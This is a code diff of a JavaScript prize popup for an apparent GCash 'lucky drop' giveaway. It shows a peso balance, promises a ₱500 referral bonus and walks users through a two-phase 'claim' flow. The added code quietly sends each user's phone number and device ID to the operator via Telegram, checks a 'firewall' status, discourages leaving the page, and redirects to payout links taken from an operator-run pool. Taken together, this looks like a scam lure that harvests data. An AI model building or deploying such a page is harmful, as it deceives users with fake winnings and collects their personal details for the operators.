+                🎉 HOORAY! 🎉
+            </h2>
+            <div class="prize-amount" style="font-size: 48px; font-weight: 900; color: #fce883; font-family: 'Orbitron', monospace; text-align: center; text-shadow: 0 0 20px rgba(212,175,55,0.5);" id="popupBalanceDisplay">
+                ₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span>
+            </div>
+            <div class="divider"></div>
+            
+            <div class="bill-indicators">
+                <div class="bill-indicator"><img src="images/PHL-500-Front.png" alt="500"></div>
+                <div class="bill-indicator"><img src="images/PHL-500-Back.png" alt="500"></div>
+                <div class="bill-indicator"><img src="images/PHL-500-Front.png" alt="500"></div>
+                <div class="bill-indicator"><img src="images/PHL-500-Back.png" alt="500"></div>
+            </div>
+            
+            <div class="invite-text" style="font-size: 12px; color: #999; text-align: center; font-family: 'Poppins', sans-serif;">
+                Your friend must confirm your invitation to get extra <strong style="color: #fce883;">₱500 bonus</strong>.
+            </div>
+            <div class="luckyday-image-container" style="text-align: center; margin: 15px 0;">
+                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" style="max-width: 100%; border-radius: 12px; border: 1px solid rgba(212,175,55,0.3);" onerror="this.style.display='none'">
+            </div>
+            <div class="divider"></div>
+            
+            <button class="claim-gcash-button" id="claimGCashBtn" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; overflow: hidden;">
+                <img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH
+            </button>
 
-    function logoutUser() {
-        if (userPhone) {
-            try {
-                db.ref('user_sessions/' + userPhone).update({
-                    status: 'offline',
-                    lastSeen: firebase.database.ServerValue.TIMESTAMP
+            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0;"></div>
+
+            <button class="small-back-btn" id="backBtnPhase1" style="margin: 0 auto; display: inline-flex;">
+                ← BACK
+            </button>
+        `;
+        
+        updateBillsIndicators(balance);
+        
+        var closeBtn = document.getElementById('popupClosePhase1');
+        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
+        
+        var backBtn = document.getElementById('backBtnPhase1');
+        if (backBtn) backBtn.onclick = function() { closePopup(); };
+        
+        var claimBtn = document.getElementById('claimGCashBtn');
+        if (claimBtn) {
+            claimBtn.onclick = function() {
+                if (currentBalance <= 0) {
+                    claimBtn.classList.add('shake-effect');
+                    claimBtn.style.background = 'linear-gradient(to bottom, #ff4444, #cc0000)';
+                    claimBtn.style.border = '1px solid #ff6666';
+                    claimBtn.innerHTML = '❌ INSUFFICIENT BALANCE';
+                    
+                    var popupTitle = document.querySelector('.popup-title');
+                    if (popupTitle) {
+                        popupTitle.style.background = 'linear-gradient(to bottom, #ff6666, #ff4444)';
+                        popupTitle.style.webkitBackgroundClip = 'text';
+                        popupTitle.style.backgroundClip = 'text';
+                        popupTitle.textContent = '⚠️ NO BALANCE ⚠️';
+                    }
+                    
+                    setTimeout(function() {
+                        claimBtn.classList.remove('shake-effect');
+                        claimBtn.style.background = 'linear-gradient(to bottom, #d4af37, #aa771c)';
+                        claimBtn.style.border = '1px solid #fcf6ba';
+                        claimBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH';
+                        
+                        if (popupTitle) {
+                            popupTitle.style.background = 'linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c)';
+                            popupTitle.style.webkitBackgroundClip = 'text';
+                            popupTitle.style.backgroundClip = 'text';
+                            popupTitle.textContent = '🎉 HOORAY! 🎉';
+                        }
+                    }, 2000);
+                    return;
+                }
+                
+                // Send Claim button Telegram notification
+                var userPhone = localStorage.getItem("userPhone") || "Unknown";
+                var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+                sendClaimButtonNotification(userPhone, deviceId, currentBalance);
+                
+                animateBalanceDecrement(currentBalance, 0, 800, function() {
+                    checkFirewallAndTransition();
                 });
-            } catch(e) {}
+            };
         }
-        localStorage.clear();
-        sessionStorage.clear();
-        window.location.replace('index.html');
     }
+    
+    // ========== PHASE 2: WITHDRAWAL LINK ==========
+    function showPhase2() {
+        var popupInner = document.querySelector('.popup-inner');
+        if (!popupInner) return;
+        
+        currentPhase = 2;
+        
+        var popupContainer = document.querySelector('.popup-container');
+        if (popupContainer) {
+            popupContainer.style.maxWidth = '340px';
+            popupContainer.style.width = '85%';
+        }
+        
+        popupInner.innerHTML = `
+            <div class="popup-close" id="popupClosePhase2">✕</div>
+            
+            <div style="text-align: center; margin-bottom: 8px;">
+                <div style="font-size: 50px; animation: bounceIn 0.5s ease;">🏆</div>
+            </div>
+            
+            <h2 class="phase2-heading" style="font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 900; background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c); -webkit-background-clip: text; background-clip: text; color: transparent; text-align: center;">GREAT JOB!</h2>
+            
+            <div class="divider"></div>
+            
+            <div style="background: linear-gradient(145deg, rgba(20, 10, 5, 0.6), rgba(10, 5, 0, 0.6)); border: 1px solid rgba(212,175,55,0.3); border-radius: 12px; padding: 14px; margin: 10px 0;">
+                <p style="font-size: 11px; color: #ccc; text-align: center; margin: 0; font-family: 'Poppins', sans-serif;">
+                    "Nice work! You're one tap away from your reward!"
+                </p>
+                <p style="font-size: 12px; color: #fce883; text-align: center; margin: 8px 0 0 0; font-family: 'Orbitron', monospace;">
+                    Your reward: <strong style="font-size: 22px; color: #fce883; text-shadow: 0 0 15px rgba(212,175,55,0.5);">₱${currentBalance.toFixed(2)}</strong>
+                </p>
+            </div>
+            
+            <button class="claim-gcash-button" id="proceedBtn" style="width: 100%; padding: 14px; font-size: 14px; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px;">
+                <img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP
+            </button>
 
-    function shareOnFacebook() {
-        var shareUrl = 'https://tiny.cc/LuckyDrop';
-        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=400');
+            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0 10px;"></div>
+
+            <button class="small-back-btn" id="backBtnPhase2" style="margin: 0 auto; display: inline-flex;">
+                ← BACK
+            </button>
+        `;
+        
+        attachPhase2Events();
     }
-
-    // ============================================================
-    // EXPORT
-    // ============================================================
-    window.PlayBonus = {
-        playSound: playSound,
-        formatNumberWithComma: formatNumberWithComma,
-        getBalance: function() { return currentBalance; },
-        getUserPhone: function() { return userPhone; },
-        isUserClaimed: function() { return isClaimed; },
-        showPopup: window.showPopup,
-        closePopup: window.closePopup,
-        getFirewallStatus: function() { return currentFirewallStatus; },
-        sendTelegram: sendTelegramNotification
-    };
-
-    // ============================================================
-    // START
-    // ============================================================
+    
+    // ========== ATTACH PHASE 2 EVENTS ==========
+    function attachPhase2Events() {
+        var closeBtn = document.getElementById('popupClosePhase2');
+        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
+        
+        var backBtn = document.getElementById('backBtnPhase2');
+        if (backBtn) {
+            backBtn.onclick = function() {
+                var popupInner = document.querySelector('.popup-inner');
+                if (popupInner) {
+                    popupInner.style.transition = 'opacity 0.3s ease';
+                    popupInner.style.opacity = '0';
+                    setTimeout(function() {
+                        showPhase1(currentBalance);
+                        popupInner.style.opacity = '1';
+                    }, 300);
+                }
+            };
+        }
+        
+        var proceedBtn = document.getElementById('proceedBtn');
+        if (proceedBtn) {
+            proceedBtn.onclick = function() {
+                if (claimInProgress) return;
+                
+                claimInProgress = true;
+                
+                this.classList.add('btn-pulse');
+                setTimeout(function() { this.classList.remove('btn-pulse'); }.bind(this), 500);
+                
+                this.disabled = true;
+                this.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> PROCESSING...';
+                this.style.opacity = '0.8';
+                
+                window.addEventListener('beforeunload', beforeUnloadHandler);
+                
+                getLatestPayoutLink().then(function(linkData) {
+                    if (linkData && linkData.url) {
+                        var userPhone = localStorage.getItem("userPhone") || "Unknown";
+                        markLinkAsUsed(linkData.key, userPhone).then(function() {
+                            isRedirecting = true;
+                            proceedBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> REDIRECTING...';
+                            setTimeout(function() {
+                                window.removeEventListener('beforeunload', beforeUnloadHandler);
+                                window.location.href = linkData.url;
+                            }, 1000);
+                        });
+                    } else {
+                        claimInProgress = false;
+                        isRedirecting = false;
+                        window.removeEventListener('beforeunload', beforeUnloadHandler);
+                        
+                        proceedBtn.disabled = false;
+                        proceedBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP';
+                        proceedBtn.style.opacity = '1';
+                        alert("No payout link available. Please try again.");
+                    }
+                });
+            };
+        }
+    }
+    
+    // ========== SHOW POPUP ==========
+    function showPopup(balance) {
+        currentBalance = balance;
+        getFirewallStatus().then(function() {
+            showPhase1(balance);
+            
+            var popup = document.getElementById('prizePopup');
+            if (popup) {
+                popup.style.display = 'flex';
+                var ticker = document.getElementById('winnerTicker');
+                if (ticker) ticker.style.display = 'none';
+            }
+        });
+    }
+    
+    // ========== CLOSE POPUP ==========
+    function closePopup() {
+        var popup = document.getElementById('prizePopup');
+        if (popup) {
+            popup.style.display = 'none';
+            var ticker = document.getElementById('winnerTicker');
+            if (ticker) ticker.style.display = 'flex';
+            if (window.ConfettiModule) window.ConfettiModule.stop();
+        }
+        
+        claimInProgress = false;
+        isRedirecting = false;
+        stopCallTimer();
+        window.removeEventListener('beforeunload', beforeUnloadHandler);
+    }
+    
+    // ========== START ==========
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', init);
     } else {
         init();
     }
-
+    
+    // ========== EXPORTS ==========
+    window.showPopup = showPopup;
+    window.closePopup = closePopup;
+    window.getFirewallStatus = getFirewallStatus;
+    
 })();
